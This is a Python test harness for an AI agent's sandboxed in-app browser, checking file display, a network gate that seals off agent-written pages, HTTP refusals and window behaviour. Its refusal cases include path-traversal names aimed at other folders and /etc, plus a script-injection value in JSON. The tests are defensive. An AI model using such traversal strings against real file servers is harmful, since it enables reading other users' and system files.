        third, _session3, context3 = make(linger_s=30.0)
        in_thread(lambda: tool(context3, "open_page", url=PAGE))
        third.stop()
        pump(0.2)
        report["after_a_stop"] = _shown(app)
        third.shutdown()
        # A page the agent wrote: the gate lets go once it is gone, though the window lingers with its still.
        folder.write("mine.html", "<title>Mine</title><body>Mine.</body>")
        fourth, _session4, context4 = make(linger_s=30.0)
        in_thread(lambda: tool(context4, "show_file", name="mine.html"))
        report["held_with_a_file_open"] = agent_browser.gate_held()
        fourth.end_run(linger=True)
        report["gate_free_while_lingering"] = wait_until(lambda: not agent_browser.gate_held(), 3)
        report["lingering_with_its_still"] = fourth.browser().window().covered()
        fourth.shutdown()
        # A later press of Stop or Turn off takes a lingering window with it.
        fifth, _session5, context5 = make(linger_s=30.0)
        in_thread(lambda: tool(context5, "open_page", url=PAGE))
        fifth.end_run(linger=True)
        fifth.stop()
        pump(0.2)
        report["stop_after_the_end"] = _shown(app)
        fifth.shutdown()
    elif case == "file":
        other_folder = TaskFolder.create(root / "ws", "another task", WHEN)
        other_folder.write("secret.html", f"<title>Secret</title>{MARK}-OTHER")
        other_folder.write("pic.svg", PIC_SVG)
        folder.write("report.html", WORK_PAGE)
        folder.write("pic.svg", PIC_SVG)
        folder.write("notes/deep.svg", PIC_SVG)
        folder.write("notes/plain.txt", f"Plain text {MARK}\nsecond line\n")
        folder.write("data.json", '{"a": "<script>window.__ran = 1</script>"}')
        folder.write("page.xml", '<?xml version="1.0"?><?xml-stylesheet href="https://www.example.org/x.xsl"?><r>xml words</r>')
        folder.write("alone.svg", PIC_SVG)
        client, _session, context = make()
        shown, _took = in_thread(lambda: tool(context, "show_file", name="report.html"))
        pump(1.5)
        browser = client.browser()
        read = web.read_page(script_in(client, web.read_script()))
        report["shown"] = describe(shown)
        report["read_after"] = read.text if read is not None else ""
        report["own_width"] = script_in(client, "document.getElementById('own').naturalWidth")
        report["token"] = browser.token
        report["sealed_while_open"] = browser.sealed()
        report["strip"] = list(browser.window().strip_texts())
        report["blocked"] = browser._shot.blocked
        plain, _took = in_thread(lambda: tool(context, "show_file", name="notes/plain.txt"))
        report["plain"] = describe(plain)
        report["json"] = describe(in_thread(lambda: tool(context, "show_file", name="data.json"))[0])
        report["json_script_ran"] = script_in(client, "window.__ran === 1")
        report["xml"] = describe(in_thread(lambda: tool(context, "show_file", name="page.xml"))[0])
        report["svg"] = describe(in_thread(lambda: tool(context, "show_file", name="alone.svg"))[0])
        looked, _took = in_thread(lambda: tool(context, "look_at_page"))
        report["look"] = [looked.code, len(looked.pictures)]
        odd_names = {}
        for name in ("mes notes/caf\u00e9 au lait.txt", "100%.txt", "a#b.txt", "a+b&c=d.txt"):
            folder.write(name, f"The words of {name}")
            odd_names[name] = in_thread(lambda name=name: tool(context, "show_file", name=name))[0].text
        report["odd_names"] = odd_names
        refused = {}
        for name in (f"../{other_folder.path.name}/secret.html", "..\\x.html", "/etc/x.html", "C:\\x.html", "nothing.html"):
            refused[name] = in_thread(lambda name=name: tool(context, "show_file", name=name))[0].code
        report["refused"] = refused

        def direct(address: str) -> str:
            """A navigation of the open page itself, as its own script could ask for: never another task's file."""
            in_thread(lambda: tool(context, "show_file", name="report.html"))
            box: dict[str, Any] = {}
            shot = browser._shot
            before = shot.blocked
            shot.page.loadFinished.connect(lambda ok: box.setdefault("ok", ok))
            shot.page.load(QUrl(address))
            wait_until(lambda: "ok" in box or browser._shot.blocked > before, 5)
            pump(0.2)
            return str(script_in(client, "document.documentElement ? document.documentElement.innerText : ''") or "")

        tok, other_name = browser.token, other_folder.path.name
        report["direct"] = {address: direct(f"jarvis-task:/{address}") for address in (
            "othertoken/report.html", f"{tok}/../othertoken/report.html", f"{tok}/%2e%2e/{other_name}/secret.html",
            f"{other_name}/secret.html", f"{tok}/report.exe", f"{tok}/nothing.html")}
        report["own_again"] = "script-ran" in direct(f"jarvis-task:/{tok}/report.html")
        # A web page's profile has no handler for the scheme, and its interceptor refuses it.
        pages[PAGE] = (f"<!doctype html><title>Web</title><body>Web page.<img id=own src='jarvis-task:/{tok}/pic.svg'>"
                       "</body>")
        web_page, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        pump(0.5)
        report["web_page"] = [web_page.code, script_in(client, "document.getElementById('own').naturalWidth"),
                              browser.sealed(), browser._shot.blocked]
        report["web_scheme_refused"] = in_thread(
            lambda: tool(context, "open_page", url=f"jarvis-task:/{tok}/report.html"))[0].code
        # If a page the agent wrote never went, the gate would stay sealed and the next web page would fail, closed.
        agent_browser._HELD[0] += 1
        stuck, took = in_thread(lambda: client.load(PAGE, timeout_s=10, cancelled=lambda: False))
        report["stuck_gate"] = [stuck.ok, snapshots.reason_kind(stuck.reason), took, agent_browser.gate_held()]
        agent_browser._HELD[0] -= 1
        client.shutdown()
    elif case in ("gate", "gate_control"):
        listener = _Listener()
        resolved: list[str] = []
        hosts: list[str] = []

        def resolve(host: str, _port: int) -> list[str]:
            resolved.append(host)
            return ["93.184.215.14"]

        def connect(_address: str, _port: int, timeout: float) -> socket.socket:
            return socket.create_connection(("127.0.0.1", listener.port), timeout=timeout)

        judge = snapshots.tunnel_target

        def noting(authority: Any) -> Any:
            found = judge(authority)
            hosts.append(found[0])
            return found

        snapshots.tunnel_target = noting
        snapshot_engine._gate_factory = lambda: snapshot_gate.ConnectGate(resolve=resolve, connect=connect)
        snapshot_engine._test_platform = lambda: False
        if case == "gate_control":
            snapshot_engine.seal_gate = lambda _sealed: None
        folder.write("leaky.html", LEAKY_PAGE)
        client, _session, context = make(html_for=None)
        seen: list[tuple[str, bool]] = []
        base = agent_browser.AgentBrowser._problem

        def noted(self: Any, shot: Any, url: Any, main_frame: bool) -> str:
            answer = base(self, shot, url, main_frame)
            seen.append((url.scheme(), bool(answer)))
            return answer

        agent_browser.AgentBrowser._problem = noted
        shown, _took = in_thread(lambda: tool(context, "show_file", name="leaky.html"))
        pump(3.5)
        browser = client.browser()
        read = web.read_page(script_in(client, web.read_script()))
        report.update(shown=shown.code, text=read.text if read is not None else "", sealed_while_open=browser.sealed(),
                      gate=snapshot_engine.gate_counts(), resolved=sorted(set(resolved)), hosts=sorted(set(hosts)),
                      hits=list(listener.hits), blocked=browser._shot.blocked, seen=sorted({list(item)[0] for item in seen}),
                      https_refused=all(answer for scheme, answer in seen if scheme == "https"))
        # Past the page the agent wrote: the gate works again, once it is really gone.
        resolved.clear()
        listener.hits.clear()
        leave = in_thread(lambda: client.load("https://after.example.org/", timeout_s=8, cancelled=lambda: False))[0]
        pump(0.3)
        report.update(sealed_after=browser.sealed(), after_load=snapshots.reason_kind(leave.reason),
                      after_resolved=sorted(set(resolved)), after_hits=list(listener.hits))
        client.shutdown()
        report["flags"] = snapshots.flag_tokens(os.environ.get("QTWEBENGINE_CHROMIUM_FLAGS", ""))
        listener.stop()
    elif case == "refused":
        # A real HTTP status through the real engine: the "gate" is a little server on loopback that answers as a site
        # would, and no connection goes anywhere else.
        site = _RefusingSite()
        snapshot_engine._gate_factory = lambda: site
        snapshot_engine._test_platform = lambda: False
        client, _session, _context = make(html_for=None, decide=lambda *_args, **_kwargs: "")
        outcomes: dict[str, Any] = {}
        for path in ("403", "403empty", "401", "429", "404", "200", "403"):
            value, _took = in_thread(lambda path=path: client.load(f"http://www.example.org/{path}", timeout_s=15,
                                                                   cancelled=lambda: False))
            pump(0.2)
            window = client.browser().window()
            picture = window.grab().toImage()
            outcomes[path] = {"ok": value.ok, "kind": snapshots.reason_kind(value.reason), "status": value.http_status,
                              "notice": list(window.notice()), "strip": list(window.strip_texts()),
                              "uniform": snapshot_engine._uniform(picture)}
        report.update(outcomes=outcomes, hits=site.hits, agents=sorted(set(site.agents)), connects=site.connects)
        browser = client.browser()
        report["profile_agent_default"] = _default_agent(snapshot_engine)
        report["hooks"] = browser.hook_counts()
        client.shutdown()
        site.stop()
    elif case == "feed_window":
        tall = "<!doctype html><title>Tall</title><body style='background:#fff'><h1>Words</h1>" + "<p>A line.</p>" * 400 + "</body>"
        pages[PAGE] = tall
        pages["https://www.example.org/second"] = tall
        pages["https://www.example.org/third"] = tall
        other = QLineEdit()
        other.show()
        other.activateWindow()
        other.setFocus()
        pump(0.1)
        client, session, context = make()
        first, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        browser = client.browser()
        window = browser.window()
        report["first"] = describe(first)
        report["shown_first"] = window.isVisible()
        report["hide_in_strip"] = {"policy": window.hide_button.focusPolicy() == Qt.FocusPolicy.NoFocus,
                                   "inside": window.rect().contains(window.hide_button.geometry()),
                                   "cut": window.cut_texts()}
        report["agent"] = browser._shot.profile.httpUserAgent()
        report["agent_default"] = _default_agent(snapshot_engine)
        asked_hide: list[bool] = []
        client.hideAsked.connect(lambda: asked_hide.append(True))
        window.hide_button.click()
        pump(0.1)
        report["hidden"] = {"visible": window.isVisible(), "asked": asked_hide, "owner": client.owner_hid()}
        second, _took = in_thread(lambda: tool(context, "open_page", url="https://www.example.org/second"))
        report["second"] = describe(second)
        report["second_visible"] = window.isVisible()
        look, _took = in_thread(lambda: tool(context, "look_at_page"))
        report["look_hidden"] = describe(look)
        client.set_hidden(owner=False)
        pump(0.2)
        report["back_visible"] = window.isVisible()
        client.set_hidden(away=True)
        pump(0.1)
        report["away_visible"] = window.isVisible()
        third, _took = in_thread(lambda: tool(context, "open_page", url="https://www.example.org/third"))
        report["third_code"] = third.code
        report["third_visible"] = window.isVisible()
        client.set_hidden(away=False)
        pump(0.2)
        report["after_away_visible"] = window.isVisible()
        # While Jarvis reads the wheel moves nothing; the strip says when a page is read another way.
        window.wheeled.emit(-240)
        pump(0.3)
        report["scroll_while_reading"] = main_world(client, "window.scrollY")
        client.other_way("www.example.net", True)
        pump(0.1)
        report["other_way_tag"] = window.strip_texts()[0]
        client.other_way("www.example.net", False)
        pump(0.1)
        report["after_other_way_tag"] = window.strip_texts()[0]
        report["focus_kept"] = QApplication.focusWidget() is other or QApplication.focusWidget() is None
        report["took_focus"] = window.isActiveWindow()
        other.hide()
        client.shutdown()
    elif case == "owner_show":
        tall = "<!doctype html><title>Report</title><body><h1>The report</h1>" + "<p>A line of it.</p>" * 400 + "</body>"
        folder.write("report.html", tall)
        pages[PAGE] = "<!doctype html><title>A page</title><body style='background:#fff'><h1>Words</h1></body>"
        client, _session, context = make(linger_s=0.2)
        in_thread(lambda: tool(context, "open_page", url=PAGE))
        browser = client.browser()
        window = browser.window()
        client.end_run(linger=True, hold=True)
        pump(0.6)                                       # past its linger: held
        report["held"] = {"visible": window.isVisible(), "tag": window.strip_texts()[0], "page": browser.has_page()}
        done: list[Any] = []
        client.show_for_owner("report.html", folder, done.append)
        report["delivered"] = wait_until(lambda: done, 15)
        pump(0.3)
        report["shown"] = {"ok": done[0].ok if done else None, "visible": window.isVisible(), "strip": list(window.strip_texts()),
                           "sealed": browser.sealed(), "title": main_world(client, "document.title"),
                           "scheme": main_world(client, "location.protocol")}
        window.wheeled.emit(-240)
        report["scrolled"] = wait_until(lambda: main_world(client, "window.scrollY"), 5)
        client.close_now()
        pump(0.3)
        report["window_gone"] = not _shown(app)
        report["sealed_after"] = agent_browser.gate_held()
        client.shutdown()
    elif case == "warm_up":
        gaps: list[float] = []
        last = [time.monotonic()]

        def beat() -> None:
            now = time.monotonic()
            gaps.append(now - last[0])
            last[0] = now

        timer = QTimer()
        timer.setInterval(10)
        timer.timeout.connect(beat)
        timer.start()
        pump(0.2)
        gaps.clear()
        report["no_warm_up_here"] = snapshot_engine.warm_up()
        report["first"] = snapshot_engine.warm_up(test_platform=True)
        report["started"] = snapshot_engine._ENGINE.started
        report["again"] = snapshot_engine.warm_up(test_platform=True)
        report["windows_after"] = _shown(app)
        report["renderers_after"] = len(children())
        pump(0.1)
        report["warm_gap"] = round(max(gaps), 3)
        gaps.clear()
        pages[PAGE] = "<!doctype html><title>A page</title><body><h1>Words</h1></body>"
        client, _session, context = make()
        opened, _took = in_thread(lambda: tool(context, "open_page", url=PAGE))
        report["opened"] = opened.code
        report["first_step_gap"] = round(max(gaps), 3)
        timer.stop()
        client.shutdown()
    elif case == "task":
        report.update(whole_task(pages, html_for, root, wait_until, pump))
    elif case == "feed_task":
        report.update(feed_task(pages, html_for, root, wait_until, pump))
    else:
        report["error"] = f"unknown case {case!r}"
    qInstallMessageHandler(None)
    report["children_end"] = 0 if wait_until(lambda: not children(), 5) else len(children())
    tmp.cleanup()
    return report


def _shown(app: Any) -> list[str]:
    return sorted(widget.objectName() for widget in app.topLevelWidgets() if widget.isVisible())


def session_look(context: Any) -> str:
    """look_at_page when no picture fits: it says so."""
    from briefing_reader.agent import tools, web
    from briefing_reader import snapshots

    browser = context.web.browser
    real = browser.picture
    browser.picture = lambda *_args, **_kwargs: snapshots.ShotResult(False, snapshots.R_TOO_LARGE)
    try:
        return tools._look_at_page({}, context).code
    finally:
        browser.picture = real
    return web.W_TOO_BIG


def cancelled_load(make: Any, pages: dict[str, Any], wait_until: Any, state: dict[str, Any], tool: Any, pump: Any) -> Any:
    """A call past its time (the endpoint gave up on it): released, the page stopped, the run goes on."""
    client, _session, context = make()
    box: dict[str, Any] = {}
    threading.Thread(target=lambda: box.setdefault("result", tool(context, "open_page", url=PAGE)), daemon=True).start()
    wait_until(lambda: client.browser() is not None and client.browser().has_page()
               and client.browser()._shot.opened, 40)
    pump(0.3)
    started = time.monotonic()
    state["cancelled"] = True
    wait_until(lambda: "result" in box, 3)
    took = round(time.monotonic() - started, 3)
    wait_until(lambda: not client.browser().has_page(), 3)
    answer = [box["result"].code, took, client.browser().has_page(), client.browser().window() is not None]
    state["cancelled"] = False
    client.shutdown()
    return answer


class _Listener:
    """Stands for a server on the internet: records what reaches it."""

    def __init__(self) -> None:
        self.hits: list[str] = []
        self._stop = threading.Event()
        self._sock = socket.socket()
        self._sock.bind(("127.0.0.1", 0))
        self._sock.listen(16)
        self._sock.settimeout(0.2)
        self.port = self._sock.getsockname()[1]
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self) -> None:
        while not self._stop.is_set():
            try:
                connection, _address = self._sock.accept()
            except OSError:
                continue
            try:
                connection.settimeout(1.0)
                data = connection.recv(64)
            except OSError:
                data = b""
            self.hits.append(data[:2].hex())
            connection.close()

    def stop(self) -> None:
        self._stop.set()


def feed_task(pages: dict[str, Any], html_for: Any, root: Path, wait_until: Any, pump: Any) -> dict[str, Any]:
    """The feed over the real controller, the real browser, the real endpoint and the real HUD windows: only Claude Code is a
    fake, and the desktop controller and Home stand-ins."""
    from PySide6.QtCore import QObject, Signal
    from PySide6.QtTest import QTest
    from PySide6.QtCore import Qt
    from PySide6.QtWidgets import QApplication

    from briefing_reader import agent_feed, agent_ui, hud_overlay, live
    from briefing_reader.agent import browser as agent_browser
    from briefing_reader.agent.runner import Timing
    from briefing_reader.config import AgentConfig
    from tests.agent_fakes import FakeEngine, FakeEngineRunner, base_engine

    tall = "<!doctype html><title>A page</title><body style='background:#fff'><h1>Words</h1></body>"
    pages["https://www.example.org/one"] = tall
    pages["https://www.example.org/two"] = tall
    report: dict[str, Any] = {}
    gates = [threading.Event() for _ in range(3)]
    reached = [threading.Event() for _ in range(3)]

    def script(engine: FakeEngine) -> None:
        engine.wait_message()
        engine.call("update_plan", steps=[{"text": "Read", "status": "doing"}, {"text": "Write", "status": "todo"}])
        engine.call("open_page", url="https://www.example.org/one")
        reached[0].set()
        gates[0].wait(30)
        engine.call("open_page", url="https://www.example.org/two")
        reached[1].set()
        gates[1].wait(30)
        engine.call("write_file", name="report.html", text="<!doctype html><title>The report</title><body>Yes.</body>")
        engine.call("finish", summary="The answer is yes. It took two pages.", outcome="done", outputs=["report.html"])
        engine.end_turn("Done.")

    engine = FakeEngine(script)
    runner = FakeEngineRunner(engine)
    config = SimpleNamespace(agent=AgentConfig(enabled=True, workspace=str(root / "workspace")),
                             desktop=SimpleNamespace(enabled=True, hide_from_capture=False),
                             ask=SimpleNamespace(enabled=True), data_dir=root / "data",
                             assistant=SimpleNamespace(address="sir"))
    planner = SimpleNamespace(engine=base_engine(root, runner), usage=SimpleNamespace(hold_until=lambda: None))
    overlay = hud_overlay.HudOverlay(hud_key="", hide_from_capture=False, native=hud_overlay.NoNative())
    overlay.show_on(QApplication.primaryScreen())

    class Desktop(QObject):
        hudChanged = Signal(bool)
        waits = 0
        revealed: list[str] = []

        def __init__(self) -> None:
            super().__init__()
            self.overlay = overlay
            self._click_guard = None

        def enter_hud(self) -> bool:
            return False

        def is_hud(self) -> bool:
            return True

        def bar(self) -> Any:
            return overlay.hud.bar

        def consent_given(self) -> bool:
            return True

        def set_task_waiting(self, count: int) -> None:
            self.waits = count

        def reveal_task_file(self, path: str) -> bool:
            self.revealed.append(path)
            return True

    class Reading(QObject):
        taskChipClicked = Signal()
        taskStopClicked = Signal()

        def set_task_look(self, _base: str) -> None:
            pass

        def set_task_chip(self, _text: str, *, can_stop: bool = False) -> None:
            pass

    def factory(parent: Any, **options: Any) -> agent_browser.BrowserClient:
        return agent_browser.BrowserClient(parent, html_for=html_for, poll_s=0.01, **options)

    desktop, reading = Desktop(), Reading()
    controller = agent_ui.AgentController(config, planner, live=live.LiveStream(), consent=lambda: True, browser_factory=factory,
                                          window_avoid=overlay.hud.occupied_rect,
                                          timing=Timing(poll_s=0.01, connect_s=5.0, init_s=20.0, tool_s=40.0,
                                                        after_finish_s=2.0, replay_s=0.5), parent=QApplication.instance())
    feed = agent_feed.TaskFeed(controller, desktop, reading, words=lambda *_a, **_k: None, reveal_live=lambda _link: None)
    report["started"] = controller.start("read two pages")
    report["first_page"] = wait_until(reached[0].is_set, 30)
    pump(0.3)
    panel, buttons = feed.panel(), feed.buttons()
    window = controller._browser.browser().window()
    report["after_first"] = {"panel": panel.isVisible(), "window": window.isVisible(), "activity": feed.activity(),
                             "head": panel.content().head,
                             "clear": not panel.geometry().intersects(overlay.hud.occupied_rect()),
                             "show_hidden": buttons.show_button.isHidden()}
    QTest.mouseClick(window.hide_button, Qt.MouseButton.LeftButton)
    pump(0.2)
    report["after_hide"] = {"window": window.isVisible(), "show_hidden": buttons.show_button.isHidden(),
                            "buttons": buttons.isVisible(), "running": controller.running}
    gates[0].set()
    report["second_page"] = wait_until(reached[1].is_set, 30)
    pump(0.2)
    report["second_activity"] = feed.activity()
    report["second_window"] = window.isVisible()
    QTest.mouseClick(buttons.show_button, Qt.MouseButton.LeftButton)
    pump(0.3)
    report["after_show"] = {"window": window.isVisible(), "show_hidden": buttons.show_button.isHidden()}
    gates[1].set()
    report["ended"] = wait_until(lambda: controller.last_end is not None, 30)
    pump(0.4)
    card = feed.card
    report["result"] = {"kicker": card.task().kicker, "body": card.task().body, "rows": [row.name for row in card.task().rows],
                        "window": window.isVisible(), "tag": window.strip_texts()[0], "page": controller._browser.browser().has_page(),
                        "spoken": agent_feed.spoken_summary(card.task().body)}
    feed._card_at -= 5
    links = card.row_buttons()
    QTest.mouseClick(links["show:report.html"], Qt.MouseButton.LeftButton)
    report["shown"] = wait_until(lambda: controller._browser.browser().has_page() and window.strip_texts()[0] == agent_browser.SHOWING_TAG, 15)
    report["sealed"] = wait_until(agent_browser.gate_held, 10)
    QTest.mouseClick(links["folder:report.html"], Qt.MouseButton.LeftButton)
    report["revealed"] = [Path(path).name for path in desktop.revealed]
    QTest.mouseClick(card.buttons()["done"], Qt.MouseButton.LeftButton)
    pump(0.5)
    report["after_done"] = {"card": feed.card is None, "panel": panel.isVisible(), "active": feed.active(),
                            "shown": [name for name in _shown(QApplication.instance()) if name in ("JarvisWatch", "JarvisPlan",
                                                                                                    "JarvisTask")]}
    report["sealed_after"] = agent_browser.gate_held()
    report["failure"] = repr(engine.failure) if engine.failure is not None else ""
    feed.shutdown()
    controller.shutdown()
    overlay.shutdown()
    pump(0.2)
    return report


def whole_task(pages: dict[str, Any], html_for: Any, root: Path, wait_until: Any, pump: Any) -> dict[str, Any]:
    """A whole web task through the real controller, the real browser and the real endpoint: only Claude Code is a
    fake."""
    from briefing_reader import agent_ui, live, pictures
    from briefing_reader.agent import browser as agent_browser, web
    from briefing_reader.agent.runner import Timing
    from briefing_reader.config import AgentConfig
    from tests.agent_fakes import FakeEngine, FakeEngineRunner, base_engine

    query = "quiet invented laptops"
    pages[web.ENGINES[0].url(query)] = DDG_PAGE
    pages["https://www.example.org/ddg-one"] = (f"<!doctype html><title>The first</title><body><h1>{MARK}</h1>"
                                                "<a href='https://www.example.org/more'>More here</a></body>")
    pages["https://www.example.org/more"] = long_page(1500)
    results: dict[str, Any] = {}

    def script(engine: FakeEngine) -> None:
        engine.wait_message()
        engine.call("update_plan", steps=[{"text": "Search", "status": "doing"}, {"text": "Report", "status": "todo"}])
        results["search"] = engine.call("web_search", query=query)
        results["open"] = engine.call("open_page", number=1)
        results["link"] = engine.call("open_page", number=3)
        results["more"] = engine.call("read_more")
        results["look"] = engine.call("look_at_page")
        engine.call("write_file", name="report.html", text=f"<title>Report</title><h1>{MARK} report</h1>")
        results["show"] = engine.call("show_file", name="report.html")
        engine.call("finish", summary="Read two pages and wrote the report.", outcome="done", outputs=["report.html"])
        engine.end_turn("Done.")

    engine = FakeEngine(script)
    runner = FakeEngineRunner(engine)
    config = SimpleNamespace(agent=AgentConfig(enabled=True, workspace=str(root / "workspace")),
                             desktop=SimpleNamespace(enabled=True, hide_from_capture=False),
                             ask=SimpleNamespace(enabled=True), data_dir=root / "data",
                             assistant=SimpleNamespace(address="sir"))
    planner = SimpleNamespace(engine=base_engine(root, runner), usage=SimpleNamespace(hold_until=lambda: None))
    stream = live.LiveStream()

    def factory(parent: Any, **options: Any) -> agent_browser.BrowserClient:
        return agent_browser.BrowserClient(parent, html_for=html_for, linger_s=0.3, poll_s=0.01, **options)

    from PySide6.QtWidgets import QApplication

    controller = agent_ui.AgentController(config, planner, live=stream, consent=lambda: True, browser_factory=factory,
                                          timing=Timing(poll_s=0.01, connect_s=5.0, init_s=20.0, tool_s=40.0,
                                                        after_finish_s=2.0, replay_s=0.5), parent=QApplication.instance())
    report: dict[str, Any] = {"started": controller.start("find me a quiet laptop")}
    report["ended"] = wait_until(lambda: controller.last_end is not None, 60)
    end = controller.last_end
    report["end"] = [end.outcome, end.code, end.summary, list(end.outputs), end.tools] if end is not None else []
    report["failure"] = repr(engine.failure) if engine.failure is not None else ""
    report["texts"] = {name: "\n".join(block.get("text", "") for block in result.get("content", ()))
                       for name, result in results.items()}
    report["look_image"] = [block.get("mimeType") for block in results.get("look", {}).get("content", ())]
    task = next(view for view in stream.snapshot() if view.kind == live.TASK_AGENT)
    report["steps"] = [{"title": step.title, "status": step.status,
                        "picture": getattr(step.picture, "kind", ""), "state": getattr(step.picture, "state", ""),
                        "caption": getattr(step.picture, "caption", ""),
                        "bytes": len(getattr(getattr(step.picture, "page", None), "image", b"") or b""),
                        "fields": {field.label: field.value for field in step.fields}} for step in task.steps]
    report["page_kind"] = pictures.KIND_PAGE
    wait_until(lambda: not _shown(QApplication.instance()), 5)
    report["windows_after"] = _shown(QApplication.instance())
    controller.shutdown()
    return report


if __name__ == "__main__":
    print(json.dumps(main(sys.argv[1] if len(sys.argv) > 1 else "")), flush=True)
    sys.stdout.flush()
    os._exit(0)                                # Chromium is gone: nothing more to wait for
